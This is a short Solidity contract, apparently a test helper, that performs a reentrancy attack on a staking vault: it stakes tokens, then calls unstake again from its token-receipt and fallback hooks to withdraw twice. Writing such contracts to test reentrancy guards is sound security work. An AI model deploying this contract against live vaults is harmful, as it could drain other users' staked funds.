// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IParticipationVault {
    function stake(uint256 brandId, uint256 amount, uint256 lockPeriodDays) external;
    function unstake(uint256 brandId, uint256 amount) external;
}

contract VaultReentrancyAttacker {
    IParticipationVault public vault;
    IERC20              public token;
    uint256             public attackBrandId;
    uint256             public attackAmount;
    bool                public attacking;

    constructor(address vault_, address token_) {
        vault = IParticipationVault(vault_);
        token = IERC20(token_);
    }

    function attack(uint256 brandId, uint256 amount, uint256 lockDays) external {
        token.approve(address(vault), type(uint256).max);
        vault.stake(brandId, amount, lockDays);
        attackBrandId = brandId;
        attackAmount  = amount;
    }

    function triggerReentrantUnstake(uint256 brandId, uint256 amount) external {
        attacking = true;
        vault.unstake(brandId, amount);
        attacking = false;
    }

    function onERC20Received(address, uint256) external {
        if (attacking) { attacking = false; vault.unstake(attackBrandId, attackAmount / 2); }
    }

    receive() external payable {}
    fallback() external payable {
        if (attacking) { attacking = false; vault.unstake(attackBrandId, attackAmount / 2); }
    }
}
